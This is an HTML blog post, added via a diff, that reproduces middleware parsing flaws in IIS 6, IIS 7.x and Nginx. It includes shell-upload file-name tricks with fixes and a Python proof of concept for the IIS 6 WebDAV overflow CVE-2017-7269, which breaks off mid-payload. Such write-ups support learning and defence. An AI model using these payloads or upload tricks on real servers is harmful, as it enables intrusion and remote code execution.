@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="中间件及其相关漏洞复现IIS相关IIS 5.x-6.x 解析漏洞一个细的知识点:IIS6.0 默认的可执行文件除了asp还包含这三种(aspx也能) 1234/yyg.asa/yyg.cer/yyg.cdx #本地测试失败,变成下载/yyg.aspx  漏洞原理未修改配置的情况下,IISasa,asp,cdx,cer这几个缀名映射的了负责解析的asp.dll。  iis 6.0解析漏洞有两种利用方">
+<meta name="keywords" content="知识点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中间件及其相关漏洞复现">
+<meta property="og:url" content="https://yingyingguaier.github.io/2018/11/23/中间件解析漏洞整理/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="中间件及其相关漏洞复现IIS相关IIS 5.x-6.x 解析漏洞一个细的知识点:IIS6.0 默认的可执行文件除了asp还包含这三种(aspx也能) 1234/yyg.asa/yyg.cer/yyg.cdx #本地测试失败,变成下载/yyg.aspx  漏洞原理未修改配置的情况下,IISasa,asp,cdx,cer这几个缀名映射的了负责解析的asp.dll。  iis 6.0解析漏洞有两种利用方">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/001_0.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/001_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/001_2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/002_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/002_2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/002_3.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/002_4.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/002_5.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/002_6.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/002_7.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/005_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/005_2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/003_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/003_2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/003_3.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/003_4.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/004_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/004_2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/004_3.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/004_4.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/002_7.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/006_2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/006_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/006_3.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/006_4.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/007_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/007_2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/007_3.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/007_4.png">
+<meta property="og:updated_time" content="2019-06-19T18:51:35.126Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="中间件及其相关漏洞复现">
+<meta name="twitter:description" content="中间件及其相关漏洞复现IIS相关IIS 5.x-6.x 解析漏洞一个细的知识点:IIS6.0 默认的可执行文件除了asp还包含这三种(aspx也能) 1234/yyg.asa/yyg.cer/yyg.cdx #本地测试失败,变成下载/yyg.aspx  漏洞原理未修改配置的情况下,IISasa,asp,cdx,cer这几个缀名映射的了负责解析的asp.dll。  iis 6.0解析漏洞有两种利用方">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/img/knowledge/Middleware_Parsing_vulnerability/001_0.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2018/11/23/中间件解析漏洞整理/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>中间件及其相关漏洞复现 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/11/23/中间件解析漏洞整理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">中间件及其相关漏洞复现
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-11-23 14:17:11" itemprop="dateCreated datePublished" datetime="2018-11-23T14:17:11+08:00">2018-11-23</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/整理/" itemprop="url" rel="index"><span itemprop="name">整理</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="中间件及其相关漏洞复现"><a href="#中间件及其相关漏洞复现" class="headerlink" title="中间件及其相关漏洞复现"></a>中间件及其相关漏洞复现</h1><h1 id="IIS相关"><a href="#IIS相关" class="headerlink" title="IIS相关"></a>IIS相关</h1><h2 id="IIS-5-x-6-x-解析漏洞"><a href="#IIS-5-x-6-x-解析漏洞" class="headerlink" title="IIS 5.x-6.x 解析漏洞"></a>IIS 5.x-6.x 解析漏洞</h2><p>一个细的知识点:IIS6.0 默认的可执行文件除了asp还包含这三种(aspx也能)</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/yyg.asa</span><br><span class="line">/yyg.cer</span><br><span class="line">/yyg<span class="selector-class">.cdx</span> #本地测试失败,变成下载</span><br><span class="line">/yyg.aspx</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>未修改配置的情况下,IIS<code>asa</code>,<code>asp</code>,<code>cdx</code>,<code>cer</code>这几个缀名映射的了负责解析的asp.dll。</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/001_0.png" alt="001_0"></p>
+<p>iis 6.0解析漏洞有两种利用方式</p>
+<h3 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/yyg.asp/yyg</span>.png</span><br></pre></td></tr></table></figure>
+
+<p>目录解析方式利用如上,在网站上建立了<code>.asp</code>或<code>.asa</code>等可利用的文件夹,在该文件夹下的任何扩张名的文件都会被IIS解析成asp文件来执行。</p>
+<p>一般的利用方式:</p>
+<p>创建目录<code>yyg.asp</code>,那么通过某种手段上传文件到该目录</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/yyg.asp/yyg</span>.png</span><br></pre></td></tr></table></figure>
+
+<p>无视后缀名即可拿shell</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/001_1.png" alt="001_1"></p>
+<h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/yyg.asp</span>;<span class="string">.png</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/001_2.png" alt="001_2"></p>
+<p><code>/yyg.asp;.png</code>分号后面的<code>.png</code>不会被解析</p>
+<h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>由于微软认为这是IIS的特性,一直没有安全补丁,可以选择高版本的IIS.</p>
+<ol>
+<li>通过正则编写,阻止非法文件名上传</li>
+<li>进行权限设置,限制用户创建文件夹</li>
+</ol>
+<h2 id="IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞解析漏洞"></a>IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞解析漏洞</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞需要Fast-CGI调用php,并且在php.ini中需要cgi.fix_pathinfo=1。在这个选项被打开的情况下,php-fpm会<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。所以，第一次fpm发现<code>yyg.png/.php</code>不存在，则去掉<code>/.php</code>，再判断<code>yyg.png</code>是否存在。当这个文件是存在的，会被作为PHP文件执行，导致解析漏洞。</p>
+<h3 id="IIS-7-5"><a href="#IIS-7-5" class="headerlink" title="IIS 7.5"></a>IIS 7.5</h3><p>测试环境:win7(x86)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)</p>
+<p>win2008R2(x64)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)</p>
+<p>需要php.ini中cgi.fix_pathinfo=1,通常情况下是默认开启。</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/002_1.png" alt="002_1"></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/002_2.png" alt="002_2"></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/002_3.png" alt="002_3"></p>
+<h3 id="IIS-7-0"><a href="#IIS-7-0" class="headerlink" title="IIS 7.0"></a>IIS 7.0</h3><p><img src="/img/knowledge/Middleware_Parsing_vulnerability/002_4.png" alt="002_4"></p>
+<h3 id="IIS-7-0-7-5-修复方式"><a href="#IIS-7-0-7-5-修复方式" class="headerlink" title="IIS 7.0/7.5 修复方式"></a>IIS 7.0/7.5 修复方式</h3><p>1.如果需要继续FastCGI方式调用PHP,可以在php.ini中设置cgi.fix_pathinfo=0,修改保存后要重启IIS,可能影响到某些服务,谨慎使用。</p>
+<p>2.增强IIS设置</p>
+<p>在IIS里找到“处理程序映射”，然后对PHP这一项进行编辑，点击“请求限制”，把“仅当请求映射至以下内容时才调用处理程序”这个选项勾上即可；</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/002_5.png" alt="002_5"></p>
+<p>查看解析结果</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/002_6.png" alt="002_6"></p>
+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>测试环境采用的是<code>vulhub</code>的<code>nginx/nginx_parsing_vulnerability</code>,说是Nginx的锅,实际还是和上面的一样,还是<code>cgi.fix_pathinfo=1</code>,当访问<code>ngnix.png/.php</code>时,<code>ngnix.png/.php</code>存在而进行修剪,最终将<code>ngnix.png</code>当php解析。</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/002_7.png" alt="002_7"></p>
+<h4 id="Nginx修复方式"><a href="#Nginx修复方式" class="headerlink" title="Nginx修复方式"></a>Nginx修复方式</h4><ol>
+<li><p>修改php.ini文件，将cgi.fix_pathinfo的值设置为0</p>
+</li>
+<li><p>正则表达式过滤非法输入,代码如下</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置nginx.conf</span></span><br><span class="line"><span class="attribute">if</span> ( <span class="variable">$fastcgi_script_name</span> <span class="regexp">~ \..*\/.*php</span> ) &#123;</span><br><span class="line">　　<span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；并借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析。</p>
+</li>
+</ol>
+<h2 id="IIS6-0远程命令执行漏洞-CVE-2017-7269"><a href="#IIS6-0远程命令执行漏洞-CVE-2017-7269" class="headerlink" title="IIS6.0远程命令执行漏洞(CVE-2017-7269)"></a>IIS6.0远程命令执行漏洞(CVE-2017-7269)</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>开启WebDAV服务的IIS 6.0存在缓存区溢出漏洞导致远程代码执行</p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>windows server2003</p>
+<h3 id="探测脚本"><a href="#探测脚本" class="headerlink" title="探测脚本"></a>探测脚本</h3><p><code>https://github.com/lcatro/CVE-2017-7269-Echo-PoC</code></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/lcatro/CVE-2017-7269-Echo-PoC</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def generate_payload(port):</span><br><span class="line">    pay='PROPFIND / HTTP/1.1<span class="symbol">\r</span><span class="symbol">\n</span>Host: localhost:'+ port  +'<span class="symbol">\r</span><span class="symbol">\n</span>Content-Length: 0<span class="symbol">\r</span><span class="symbol">\n</span>'</span><br><span class="line">    pay+='If: &lt;http://localhost:' + port + '/aaaaaaa'</span><br><span class="line">    pay+='<span class="symbol">\x</span>e6<span class="symbol">\x</span>bd<span class="symbol">\x</span>a8<span class="symbol">\x</span>e7<span class="symbol">\x</span>a1<span class="symbol">\x</span>a3<span class="symbol">\x</span>e7<span class="symbol">\x</span>9d<span class="symbol">\x</span>a1<span class="symbol">\x</span>e7<span class="symbol">\x</span>84<span class="symbol">\x</span>b3<span class="symbol">\x</span>e6<span class="symbol">\x</span>a4<span class="symbol">\x</span>b6<span class="symbol">\x</span>e4<span class="symbol">\x</span>9d<span class="symbol">\x</span>b2<span class="symbol">\x</span>e7<span class="symbol">\x</span>a8<span class="symbol">\x</span>b9<span class="symbol">\x</span>e4<span class="symbol">\x</span>ad<span class="symbol">\x</span>b7<span class="symbol">\x</span>e4<span class="symbol">\x</span>bd<span class="symbol">\x</span>b0<span class="symbol">\x</span>e7<span class="symbol">\x</span>95<span class="symbol">\x</span>93<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>8f<span class="symbol">\x</span>e4<span class="symbol">\x</span>a1<span class="symbol">\x</span>a8<span class="symbol">\x</span>e5<span class="symbol">\x</span>99<span class="symbol">\x</span>a3<span class="symbol">\x</span>e6<span class="symbol">\x</span>b5<span class="symbol">\x</span>94<span class="symbol">\x</span>e6<span class="symbol">\x</span>a1<span class="symbol">\x</span>85<span class="symbol">\x</span>e3<span class="symbol">\x</span>a5<span class="symbol">\x</span>93<span class="symbol">\x</span>e5<span class="symbol">\x</span>81<span class="symbol">\x</span>ac<span class="symbol">\x</span>e5<span class="symbol">\x</span>95<span class="symbol">\x</span>a7<span class="symbol">\x</span>e6<span class="symbol">\x</span>9d<span class="symbol">\x</span>a3<span class="symbol">\x</span>e3<span class="symbol">\x</span>8d<span class="symbol">\x</span>a4<span class="symbol">\x</span>e4<span class="symbol">\x</span>98<span class="symbol">\x</span>b0<span class="symbol">\x</span>e7<span class="symbol">\x</span>a1<span class="symbol">\x</span>85<span class="symbol">\x</span>e6<span class="symbol">\x</span>a5<span class="symbol">\x</span>92<span class="symbol">\x</span>e5<span class="symbol">\x</span>90<span class="symbol">\x</span>b1<span class="symbol">\x</span>e4<span class="symbol">\x</span>b1<span class="symbol">\x</span>98<span class="symbol">\x</span>e6<span class="symbol">\x</span>a9<span class="symbol">\x</span>91<span class="symbol">\x</span>e7<span class="symbol">\x</span>89<span class="symbol">\x</span>81<span class="symbol">\x</span>e4<span class="symbol">\x</span>88<span class="symbol">\x</span>b1<span class="symbol">\x</span>e7<span class="symbol">\x</span>80<span class="symbol">\x</span>b5<span class="symbol">\x</span>e5<span class="symbol">\x</span>a1<span class="symbol">\x</span>90<span class="symbol">\x</span>e3<span class="symbol">\x</span>99<span class="symbol">\x</span>a4<span class="symbol">\x</span>e6<span class="symbol">\x</span>b1<span class="symbol">\x</span>87<span class="symbol">\x</span>e3<span class="symbol">\x</span>94<span class="symbol">\x</span>b9<span class="symbol">\x</span>e5<span class="symbol">\x</span>91<span class="symbol">\x</span>aa<span class="symbol">\x</span>e5<span class="symbol">\x</span>80<span class="symbol">\x</span>b4<span class="symbol">\x</span>e5<span class="symbol">\x</span>91<span class="symbol">\x</span>83<span class="symbol">\x</span>e7<span class="symbol">\x</span>9d<span class="symbol">\x</span>92<span class="symbol">\x</span>e5<span class="symbol">\x</span>81<span class="symbol">\x</span>a1<span class="symbol">\x</span>e3<span class="symbol">\x</span>88<span class="symbol">\x</span>b2<span class="symbol">\x</span>e6<span class="symbol">\x</span>b5<span class="symbol">\x</span>8b<span class="symbol">\x</span>e6<span class="symbol">\x</span>b0<span class="symbol">\x</span>b4<span class="symbol">\x</span>e3<span class="symbol">\x</span>89<span class="symbol">\x</span>87<span class="symbol">\x</span>e6<span class="symbol">\x</span>89<span class="symbol">\x</span>81<span class="symbol">\x</span>e3<span class="symbol">\x</span>9d<span class="symbol">\x</span>8d<span class="symbol">\x</span>e5<span class="symbol">\x</span>85<span class="symbol">\x</span>a1<span class="symbol">\x</span>e5<span class="symbol">\x</span>a1<span class="symbol">\x</span>a2<span class="symbol">\x</span>e4<span class="symbol">\x</span>9d<span class="symbol">\x</span>b3<span class="symbol">\x</span>e5<span class="symbol">\x</span>89<span class="symbol">\x</span>90<span class="symbol">\x</span>e3<span class="symbol">\x</span>99<span class="symbol">\x</span>b0<span class="symbol">\x</span>e7<span class="symbol">\x</span>95<span class="symbol">\x</span>84<span class="symbol">\x</span>e6<span class="symbol">\x</span>a1<span class="symbol">\x</span>aa<span class="symbol">\x</span>e3<span class="symbol">\x</span>8d<span class="symbol">\x</span>b4<span class="symbol">\x</span>e4<span class="symbol">\x</span>b9<span class="symbol">\x</span>8a<span class="symbol">\x</span>e7<span class="symbol">\x</span>a1<span class="symbol">\x</span>ab<span class="symbol">\x</span>e4<span class="symbol">\x</span>a5<span class="symbol">\x</span>b6<span class="symbol">\x</span>e4<span class="symbol">\x</span>b9<span class="symbol">\x</span>b3<span class="symbol">\x</span>e4<span class="symbol">\x</span>b1<span class="symbol">\x</span>aa<span class="symbol">\x</span>e5<span class="symbol">\x</span>9d<span class="symbol">\x</span>ba<span class="symbol">\x</span>e6<span class="symbol">\x</span>bd<span class="symbol">\x</span>b1<span class="symbol">\x</span>e5<span class="symbol">\x</span>a1<span class="symbol">\x</span>8a<span class="symbol">\x</span>e3<span class="symbol">\x</span>88<span class="symbol">\x</span>b0<span class="symbol">\x</span>e3<span class="symbol">\x</span>9d<span class="symbol">\x</span>ae<span class="symbol">\x</span>e4<span class="symbol">\x</span>ad<span class="symbol">\x</span>89<span class="symbol">\x</span>e5<span class="symbol">\x</span>89<span class="symbol">\x</span>8d<span class="symbol">\x</span>e4<span class="symbol">\x</span>a1<span class="symbol">\x</span>a3<span class="symbol">\x</span>e6<span class="symbol">\x</span>bd<span class="symbol">\x</span>8c<span class="symbol">\x</span>e7<span class="symbol">\x</span>95<span class="symbol">\x</span>96<span class="symbol">\x</span>e7<span class="symbol">\x</span>95<span class="symbol">\x</span>b5<span class="symbol">\x</span>e6<span class="symbol">\x</span>99<span class="symbol">\x</span>af<span class="symbol">\x</span>e7<span class="symbol">\x</span>99<span class="symbol">\x</span>a8<span class="symbol">\x</span>e4<span class="symbol">\x</span>91<span class="symbol">\x</span>8d<span class="symbol">\x</span>e5<span class="symbol">\x</span>81<span class="symbol">\x</span>b0<span class="symbol">\x</span>e7<span class="symbol">\x</span>a8<span class="symbol">\x</span>b6<span class="symbol">\x</span>e6<span class="symbol">\x</span>89<span class="symbol">\x</span>8b<span class="symbol">\x</span>e6<span class="symbol">\x</span>95<span class="symbol">\x</span>97<span class="symbol">\x</span>e7<span class="symbol">\x</span>95<span class="symbol">\x</span>90<span class="symbol">\x</span>e6<span class="symbol">\x</span>a9<span class="symbol">\x</span>b2<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>ab<span class="symbol">\x</span>e7<span class="symbol">\x</span>9d<span class="symbol">\x</span>a2<span class="symbol">\x</span>e7<span class="symbol">\x</span>99<span class="symbol">\x</span>98<span class="symbol">\x</span>e6<span class="symbol">\x</span>89<span class="symbol">\x</span>88<span class="symbol">\x</span>e6<span class="symbol">\x</span>94<span class="symbol">\x</span>b1<span class="symbol">\x</span>e3<span class="symbol">\x</span>81<span class="symbol">\x</span>94<span class="symbol">\x</span>e6<span class="symbol">\x</span>b1<span class="symbol">\x</span>b9<span class="symbol">\x</span>e5<span class="symbol">\x</span>81<span 